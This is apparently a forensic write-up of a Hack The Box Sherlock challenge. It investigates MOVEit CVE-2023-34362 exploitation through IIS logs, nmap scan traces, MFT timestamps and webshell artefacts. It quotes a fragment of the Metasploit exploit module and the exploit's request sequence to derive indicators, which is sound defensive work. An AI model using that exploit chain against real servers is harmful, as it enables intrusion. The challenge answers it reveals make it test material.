'''
https://0xdf.gitlab.io/2023/11/17/htb-sherlock-i-like-to.html

Background
Scenario
We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here…

Questions
To solve this challenge, I’ll need to answer the following 14 questions:

Name of the ASPX webshell uploaded by the attacker?
What was the attacker’s IP address?
What user agent was used to perform the initial attack?
When was the ASPX webshell uploaded by the attacker?
The attacker uploaded an ASP webshell which didn’t work, what is its filesize in bytes?
Which tool did the attacker use to initially enumerate the vulnerable server?
We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC).
Which protocol did the attacker utilize to remote into the compromised machine?
Please confirm the date and time the attacker remotely accessed the compromised machine?
What was the useragent that the attacker used to access the webshell?
What is the inst ID of the attacker?
What command was run by the attacker to retrieve the webshell?
What was the string within the title header of the webshell deployed by the TA?
What did the TA change the our moveitsvc account password to?
MOVEit Transfer
Background
MOVEit is an “enterprise-class” file transfer software meant to transfer files securely and keep audit logs.

CVE-2023-34362
In early June 2023, the CLOP ransomware groups started mass-exploitation of MOVEit servers across the internet exploiting CVE-2023-34362. CVE-2023-34362 is a SQL injection vulnerability that not only gives access to the database, but in some cases can lead to remote code execution thought a deserialization attack.

For me, it’s useful to look at a POC for the exploit to understand what artifacts I might expect to find in the logs. I’ll find this one which is in Python (easiest for me to understand). On a quick review, I’ll note:

The get_csrf function sends a POST to /guestaccess.aspx to get a CSRF token. It seems clear from this and the comments that this is a legix part of the MOVEit application.
The start_upload function sends a POST to /api/v1/folders/{folder_id}/files. Part of this payload is the output of ysoserial.exe, a Java serialization payload generator (MOVEit is a Java application).
This post from MOVEit also has good details about the attack and how to look for artifacts, though much of it involves looking in the inetpub\wwwroot directory, which is not present in the given collection.

This post from Assetnote has some useful information as well:

image-20231116140928646
Metasploit
My habit with proof of concept exploits is to look for one in Python where possible, because it’s the language I’m most comfortable with. And when I’m just trying to understand how the exploit works, that’s great.

But on the defensive side, it’s also worth understanding the various exploits that people are actually using, because they may leave different artifacts. Seeing the User Agent of “Ruby” is a good hint that this could be a Metasploit exploit, and makes it worth taking a look.

The source code for the exploit is available on GitHub. With this analysis, I’m less concerned with how the exploit works, and more interested in artifacts / indicators.

For example, on line 71, it sets @guest_email_addr to be 5-12 random alphanumeric characters @ a domain that is 3-6 random alphanumeric characters “.com”.

On lines 72-74 it sets a similar file name and file size, and generates random text to that size.

    @guest_email_addr = "#{Rex::Text.rand_text_alphanumeric(5..12)}@#{Rex::Text.rand_text_alphanumeric(3..6)}.com"
    @uploadfile_name = Rex::Text.rand_text_alphanumeric(8..15)
    @uploadfile_size = rand(5..64)
    @uploadfile_data = Rex::Text.rand_text_alphanumeric(@uploadfile_size)
Later in lines 378-385, there’s a function call to set_session which takes a hard-coded MyPkgInstID of 1234:

    set_session({
      'MyPkgAccessCode' => 'accesscode', # Must match the final request Arg06
      'MyPkgID' => '0', # Is self provisioned? (must be 0)
      'MyGuestEmailAddr' => @guest_email_addr, # Must be a valid email address @ MOVEit.DMZ.ClassLib.dll/MOVEit.DMZ.ClassLib/MsgEngine.cs
      'MyPkgInstID' => '1234', # this can be any int value
      'MyPkgSelfProvisionedRecips' => sql_payload,
      'MyUsername' => 'Guest'
    })
Files
The challenge gives a zip archive that unpacks to provide two files:

I-like-to-27a787c5.vmem
Triage.zip
Memory Dump
Without a .vmss file to go with the vmem file, it’s going to be difficult (or impossible) to load this into Volatility to do memory analysis. However, the hint from the scenario applies here:

PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here…

My first thought is to run strings against it. The dump is 4GB, so there are a ton of strings. Once I have an idea of what I might be looking for, some targeted strings | grep might be useful.

Kape
Triage.zip unpacks a Triage folder, which contains the output of a run of a tool named Kape. This tool is configured to collect a selection of files from the filesystem, and has plugins available to get files related to different things. For example, there’s an option for Microsoft Teams that will colllect Teams-related configurations and data files.

At the top level, there are a bunch of JSON files:

oxdf@hacky$ ls
collection_context.json  log.json  log.json.index  requests.json  results  uploads  uploads.json  uploads.json.index
log.json is one shows everything that’s being collecting. The requests folder has metadata about the files collected.

The main set of files is in uploads:

oxdf@hacky$ ls Triage/uploads
auto  moveit.sql  ntfs
It has a dump of the SQL database, as well as auto which has the files collected, and ntfs has things like the Master File Table and other OS metadata.

Data List
It’s worth making a list of the different data I have here and to think about what I might find it in.

MFT (Triage/uploads/ntfs/%5C%5C.%5CC%3A/$MFT)
IIS logs (Triage/uploads/auto/C%3A/inetpub/logs/LogFiles/W3SVC2/u_ex230712.log)
PowerShell History Files (Triage/uploads/auto/C%3A/users/)
Event Logs (Triage/uploads/auto/C%3A/Windows/System32/winevt/Logs/)
SQLdump (Triage/uploads/moveit.sql)
Memory dump (I-like-to-27a787c5.vmem)
Registry hives (Triage/uploads/auto/C%3A/Windows/System32/config/) - (I won’t end up using this, but it’s there!)
Strategy
From here, I will work through the various logs trying to figure out what happened during the incident. I’ll keep a timeline of events as well as the answers to the questions, both of which will be at the end of this post.

IIS Logs
Identify
Locate
Given that I’m looking for evidence about a SQL injection attack in a web application, I’m going to start with the IIS logs. Several of the question seem like they could be answerable from there.

I’ll start looking in the C:\inetpub directory, as that’s where IIS stuff lives on Windows. In Triage/uploads/auto/C%3A/inetpub/logs/LogFiles/W3SVC2 there is a file, u_ex230712.log.

Format
The top of the file gives the column headers, which is very useful to have:

oxdf@hacky$ head u_ex230712.log
#Software: Microsoft Internet Information Services 10.0
#Version: 1.0
#Date: 2023-07-12 10:08:39
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2023-07-12 10:08:39 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 - - 200 0 64 5375
2023-07-12 10:08:39 10.10.0.25 GET / - 80 - 10.255.254.3 - - 302 0 64 11023
2023-07-12 10:08:41 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 - - 200 0 0 118
2023-07-12 10:08:41 10.10.0.25 GET / - 443 - 10.255.254.3 - - 200 0 64 5649
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 101
2023-07-12 10:11:15 10.10.0.25 GET /nmaplowercheck1689156596 - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 128
The values are space separated, and defined in more detail here.

Analysis
General Histogram
I’ll start by looking at the client IP (c-ip) which is the 9th column. I’ll use cut to get just that, and then sort | uniq -c | sort -nr to get a histogram of the results:

oxdf@hacky$ cat u_ex230712.log | cut -d' ' -f9 | sort | uniq -c | sort -nr
    274 10.255.254.3
     34 ::1
     29 10.255.254.2
      6 127.0.0.1
      6 
      2 cs-username
The vast majority of the traffic is from 10.255.254.3. Assuming the attacker isn’t on localhost, the only other option is the same .2.

The 5th column is the request paths:

oxdf@hacky$ cat u_ex230712.log | cut -d' ' -f5 | sort | uniq -c | sort -nr
     64 /guestaccess.aspx
     59 /
     34 /moveitisapi/moveitisapi.dll
     34 /machine2.aspx
     16 /api/v1/folders/966794435/files
      8 /api/v1/token
      8 /api/v1/folders
      6 /machine.aspx
      5 /human.aspx
      4 /js/dist/vendors.rbundle.js
      4 /js/dist/vendors.rbundle.css
      4 /js/dist/shared.rbundle.js
      4 /js/dist/shared.rbundle.css
      4 /js/dist/runtime.rbundle.js
      4 /js/dist/polyfills.rbundle.js
      4 /js/dist/keyboard.rbundle.js
      4 /js/dist/keyboard.rbundle.css
      4 /js/dist/jquery.smartbanner.js
      4 /js/dist/jquery.smartbanner.css
      4 /js/dist/jquery.min.js
      4 
      3 /moveit.asp
      3 /favicon.ico
      2 /templates/stylesheet_MOVEit_2016.css
      2 /templates/progression.css
      2 /templates/en/pendoSnippet.js
      2 /templates/buttonlinkbase.css
      2 /templates/bootstrap_custom.css
      2 Services
      2 /sdk
      2 /robots.txt
      2 /nmaplowercheck1689156596
      2 /move.aspx
      2 /images/null.gif
      2 /images/keyboard.png
      2 /images/InstLogos/logoright_3636.png
      2 /images/InstLogos/logobig_3636.png
      2 /images/InstLogos/headerbg_3636.gif
      2 /images/icontechsupport1.png
      2 /images/favicon.ico
      2 /images/drag-drop-bg.svg
      2 /images/customscheme/moveit_2019_tagline.png
      2 /images/customscheme/moveit_2016_backart.png
      2 /HNAP1
      2 /.git/HEAD
      2 /fonts/open-sans-v13-cyrillic_latin_greek-regular.woff2
      2 /fonts/open-sans-v13-cyrillic_latin_greek-700.woff2
      2 /evox/about
      2 cs-method
      1 /IPHTTPS
      1 /fonts/open-sans-v13-cyrillic_latin_greek-600.woff2
      1 /fonts/fontawesome-webfont.woff2
      1 /api/v1/files/974387947
      1 /api/v1/files/974355270
      1 /api/v1/files/974331243
      1 /api/v1/files/974274452
      1 /api/v1/files/974247918
      1 /api/v1/files/974155582
      1 /api/v1/files/974134892
      1 /api/v1/files/974134622
expand
I’ll use grep to filter out some extensions I don’t care about (images, CSS, Javascript) and what’s left is a bit cleaner:

oxdf@hacky$ cat u_ex230712.log | cut -d' ' -f5 | sort | uniq -c | sort -nr | grep -v -e '.js$' -e '.png$' -e '.woff2$' -e '.css$' -e '.gif$' -e '.ico$' -e '.svg$'
     64 /guestaccess.aspx
     59 /
     34 /moveitisapi/moveitisapi.dll
     34 /machine2.aspx
     16 /api/v1/folders/966794435/files
      8 /api/v1/token
      8 /api/v1/folders
      6 /machine.aspx
      5 /human.aspx
      4 
      3 /moveit.asp
      2 Services
      2 /sdk
      2 /robots.txt
      2 /nmaplowercheck1689156596
      2 /move.aspx
      2 /HNAP1
      2 /.git/HEAD
      2 /evox/about
      2 cs-method
      1 /IPHTTPS
      1 /api/v1/files/974387947
      1 /api/v1/files/974355270
      1 /api/v1/files/974331243
      1 /api/v1/files/974274452
      1 /api/v1/files/974247918
      1 /api/v1/files/974155582
      1 /api/v1/files/974134892
      1 /api/v1/files/974134622
There are a bunch of requests at the bottom to different /api/v1/files/ directories. There’s also a request to /nmaplowercheck1689156596, which looks like an nmap thing.

User Agent Analysis
The fifth entry in the IIS log starts a block of requests that have the Nmap User Agent String (Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)) coming from 10.255.254.3:

2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 101
2023-07-12 10:11:15 10.10.0.25 GET /nmaplowercheck1689156596 - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 128
2023-07-12 10:11:15 10.10.0.25 GET / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 302 0 0 135
2023-07-12 10:11:15 10.10.0.25 POST / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 302 0 0 156
2023-07-12 10:11:15 10.10.0.25 GET /robots.txt - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 80
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 80
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 80
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 80
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 80
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 92
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 90
2023-07-12 10:11:15 10.10.0.25 GET /evox/about - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 91
2023-07-12 10:11:15 10.10.0.25 WURP / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 104
2023-07-12 10:11:15 10.10.0.25 GET /HNAP1 - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 98
2023-07-12 10:11:15 10.10.0.25 POST /sdk - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 77
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 89
2023-07-12 10:11:15 10.10.0.25 POST / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 160
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 212
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 392
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 76
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 75
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 234
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 398
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 297
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 122
2023-07-12 10:11:15 10.10.0.25 GET / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 302 0 0 128
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 47
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 47
2023-07-12 10:11:15 127.0.0.1 POST /machine.aspx - 80 - 127.0.0.1 - - 200 0 0 18
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 102
2023-07-12 10:11:15 10.10.0.25 GET / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 232
2023-07-12 10:11:15 10.10.0.25 GET /robots.txt - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 72
2023-07-12 10:11:15 10.10.0.25 PROPFIND / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 51
2023-07-12 10:11:15 10.10.0.25 GET /nmaplowercheck1689156596 - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 48
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 91
2023-07-12 10:11:15 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 43
2023-07-12 10:11:16 10.10.0.25 TUMV / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 49
2023-07-12 10:11:16 10.10.0.25 GET /.git/HEAD - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 48
2023-07-12 10:11:16 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 92
2023-07-12 10:11:16 10.10.0.25 GET /favicon.ico - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 554
2023-07-12 10:11:16 10.10.0.25 GET /HNAP1 - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 50
2023-07-12 10:11:16 10.10.0.25 GET /evox/about - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 50
2023-07-12 10:11:16 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 51
2023-07-12 10:11:16 10.10.0.25 PROPFIND / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 62
2023-07-12 10:11:16 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 98
2023-07-12 10:11:16 10.10.0.25 POST /sdk - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 52
2023-07-12 10:11:16 10.10.0.25 POST /IPHTTPS - 443 - 10.255.254.3 - - 400 0 2148734208 70
2023-07-12 10:11:16 10.10.0.25 GET /.git/HEAD - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 404 0 2 91
2023-07-12 10:11:16 10.10.0.25 GET / - 80 - 10.255.254.3 - - 302 0 0 91
2023-07-12 10:11:16 10.10.0.25 OPTIONS / - 80 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 143
2023-07-12 10:11:16 10.10.0.25 PROPFIND / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 405 0 1 101
2023-07-12 10:11:16 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 101
2023-07-12 10:11:17 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 145
2023-07-12 10:11:17 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 66
2023-07-12 10:11:17 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 112
2023-07-12 10:11:18 10.10.0.25 OPTIONS / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 79
2023-07-12 10:11:23 10.10.0.25 GET / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 156
2023-07-12 10:11:23 10.10.0.25 GET / - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 0 103
2023-07-12 10:11:23 10.10.0.25 HEAD / - 443 - 10.255.254.3 AnyConnect+Darwin_i386+3.1.05160 - 200 0 0 100
2023-07-12 10:11:23 10.10.0.25 GET /favicon.ico - 443 - 10.255.254.3 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html) - 200 0 995 198
expand
There are a bunch more logs after that, running from 10:11:15 until 10:11:23.

A Linux UserAgent then visits / at 10:20:35, and gets a 302 redirect, loading /humax.aspx and all the images and other files that come with it five seconds later.

At 10:21:53 there’s a POST to /machine2.aspx from a user-agent “Ruby”. This is an exploitation attempt (more on this to come). There are several more exploitation attempts, with a break at 10:25:56 for Firefox to visit from the same source IP. Exploitation attempts resume at 10:47:03, and continue on and off until 11:08:37, when the actor visits /moveit.asp and /move.aspx. It seems safe to say that one of those is the webshell.

Exploit Attempts
The Assetnote post suggests that exploitation looks like the following requests:

GET /MOVEitISAPI/MOVEitISAPI.dll?action=2
POST /machine2.aspx
POST /guestaccess.aspx
POST /api/v1/token
GET /api/v1/folders
POST /api/v1/folders/{id}/files?uploadType=resumable
PUT /api/v1/folders/{id}/files?uploadType=resumable&fileId={id}
That’s what is in the logs at 10:21:52:

2023-07-12 10:21:52 10.10.0.25 GET / - 443 - 10.255.254.3 Ruby - 200 0 0 78
2023-07-12 10:21:53 ::1 POST /machine2.aspx - 80 - ::1 CWinInetHTTPClient - 200 0 0 92
2023-07-12 10:21:53 10.10.0.25 GET /moveitisapi/moveitisapi.dll action=m2 443 - 10.255.254.3 Ruby - 200 0 0 818
2023-07-12 10:21:53 ::1 POST /machine2.aspx - 80 - ::1 CWinInetHTTPClient - 200 0 0 180
2023-07-12 10:21:53 10.10.0.25 GET /moveitisapi/moveitisapi.dll action=m2 443 - 10.255.254.3 Ruby - 200 0 0 206
For some reason it’s unable to get past the first steps. But later attempts look much more like the full chain. For example:

2023-07-12 11:08:29 ::1 POST /machine2.aspx - 80 - ::1 CWinInetHTTPClient - 200 0 0 17
2023-07-12 11:08:29 10.10.0.25 GET /moveitisapi/moveitisapi.dll action=m2 443 - 10.255.254.3 Ruby - 200 0 0 81
2023-07-12 11:08:29 10.10.0.25 POST /guestaccess.aspx - 443 - 10.255.254.3 Ruby - 200 0 0 165
2023-07-12 11:08:30 10.10.0.25 POST /guestaccess.aspx - 443 - 10.255.254.3 Ruby - 200 0 0 201
2023-07-12 11:08:30 10.10.0.25 POST /api/v1/token - 443 - 10.255.254.3 Ruby - 200 0 0 188
2023-07-12 11:08:30 10.10.0.25 GET /api/v1/folders - 443 - 10.255.254.3 Ruby - 200 0 0 112
2023-07-12 11:08:32 10.10.0.25 POST /api/v1/folders/966794435/files uploadType=resumable 443 - 10.255.254.3 Ruby - 200 0 0 144
WebShells
At the end of the log file, the actor makes multiple attempts to access moveit.asp and move.aspx:

2023-07-12 11:18:36 10.10.0.25 GET /moveit.asp - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 404 0 2 106
2023-07-12 11:18:36 10.10.0.25 GET /favicon.ico - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 https://moveit.htb/moveit.asp 200 0 0 369
2023-07-12 11:19:46 10.10.0.25 GET /moveit.asp - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 404 3 50 36
2023-07-12 11:20:37 10.10.0.25 GET /moveit.asp - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 404 3 50 35
2023-07-12 11:24:43 10.10.0.25 GET /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 200 0 0 1179
2023-07-12 11:24:47 10.10.0.25 POST /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 https://moveit.htb/move.aspx 200 0 0 159
I’ll want more information about these.

MFT
Tools
MFTExplorer
I am not aware of a good MFT tool that runs on Linux, so I’ll switch to a Windows VM and grab a copy of MFTExplorer (from Eric Zimmerman, a name you will come to know doing DFIR analysis).

Running it opens a GUI:

image-20231116150919447
“File” -> “Load MFT” opens a dialog where I can find the MFT in the ntfs folder in uploads:

oxdf@hacky$ ls uploads/ntfs/%5C%5C.%5CC%3A/
'$Boot'  '$Extend'  '$LogFile'  '$MFT'
It takes forever to load (at least 30 minutes for me… in the future may want to start this at the beginning of the analysis).

MFTECmd.exe
A much easier way to process an MFT is with another tool from Eric Zimmerman, MFTECmd.exe. I’ll use it to make a CSV file from the MFT:

C:Tools\ZimmermanTools>.\MFTECmd.exe -f C:\Users\0xdf\Desktop\$MFT --csv Z:\hackthebox-sherlocks\i-like-to\MFT
MFTECmd version 1.2.2.1

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd

Command line: -f C:\Users\0xdf\Desktop\$MFT --csv Z:\hackthebox-sherlocks\i-like-to\

File type: Mft

Processed C:\Users\0xdf\Desktop\$MFT in 7.3140 seconds

C:\Users\0xdf\Desktop\$MFT: FILE records found: 318,161 (Free records: 214,500) File size: 520.2MB
        CSV output will be saved to Z:\hackthebox-sherlocks\i-like-to\20231116221516_MFTECmd_$MFT_Output.csv
This file can be loaded into something like Timeline Explorer, or just manually looked at with grep.

Analysis
moveit.asp
In MFTExplorer, I can find both webshells in C:\MOVEitTransfer\wwwroot:

image-20231116172027180Click for full size image

Interestingly, a file of the same size and name for moveit.asp is in C:\inetpub\wwwroot, the standard IIS directory. The copy in inetpub seems to have been created first, as it’s timestamps show it was created at 11:17:12:

image-20231116172222851
The version in MOVEitTransfer was created two minutes later, but with the same content modified times:

image-20231116172317515
This implies that the first one was uploaded (perhaps to the wrong directory), and then copied to the MOVEit directory. Both files have a file size of 0x552 = 1362 bytes:

image-20231116172422592
The same info is available from the CSV from MFTECmd.exe. The first row has the headers:

oxdf@hacky$ head -1 20231116221516_MFTECmd_\$MFT_Output.csv 
EntryNumber,SequenceNumber,InUse,ParentEntryNumber,ParentSequenceNumber,ParentPath,FileName,Extension,FileSize,ReferenceCount,ReparseTarget,IsDirectory,HasAds,IsAds,SI<FN,uSecZeros,Copied,SiFlags,NameType,Created0x10,Created0x30,LastModified0x10,LastModified0x30,LastRecordChange0x10,LastRecordChange0x30,LastAccess0x10,LastAccess0x30,UpdateSequenceNumber,LogfileSequenceNumber,SecurityId,ObjectIdFileDroid,LoggedUtilStream,ZoneIdContents
There are two files named moveit.asp:

oxdf@hacky$ cat 20231116221516_MFTECmd_\$MFT_Output.csv | grep moveit.asp
100896,6,True,274233,9,.\MOVEitTransfer\wwwroot,moveit.asp,.asp,1362,1,,False,False,False,False,False,True,Archive,DosWindows,2023-07-12 11:19:37.3316397,,2023-07-12 11:17:12.7120642,2023-07-12 11:19:37.3316397,2023-07-12 11:17:12.7120642,2023-07-12 11:19:37.3316397,2023-07-12 11:19:37.3316397,,1808725272,609575211,1936,,,
273729,50,True,265340,5,.\inetpub\wwwroot,moveit.asp,.asp,1362,1,,False,False,False,False,False,False,Archive,DosWindows,2023-07-12 11:17:12.6808372,,2023-07-12 11:17:12.7120642,2023-07-12 11:17:12.6808372,2023-07-12 11:17:12.7120642,2023-07-12 11:17:12.6808372,2023-07-12 11:17:12.7120642,2023-07-12 11:17:12.6808372,1808710920,609432138,1935,,,
move.aspx
move.aspx is in C:\MOVEitTransfer\wwwroot:

image-20231116164133949
It was created at 11:24:30, with a size of 0x578 = 1400 bytes.

The same can be observer in the CSV. I’ll use cut to get the file path and name and timestamps:

oxdf@hacky$ cat 20231116221516_MFTECmd_\$MFT_Output.csv | cut -d, -f 6-9,20-27 | grep move.aspx
.\MOVEitTransfer\wwwroot,move.aspx,.aspx,1400,2023-07-12 11:24:30.4297594,,2023-07-12 11:24:30.4610703,2023-07-12 11:24:30.4297594,2023-07-12 11:24:30.4610703,2023-07-12 11:24:30.4297594,2023-07-12 11:24:30.4610703,2023-07-12 11:24:30.4297594
.\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\9a11d1d0\5debd404,move.aspx.cdcab7d2.compiled,.compiled,294,2023-07-12 11:24:43.3828834,,2023-07-12 11:24:43.3828834,,2023-07-12 11:24:43.3828834,,2023-07-12 11:24:43.3828834,
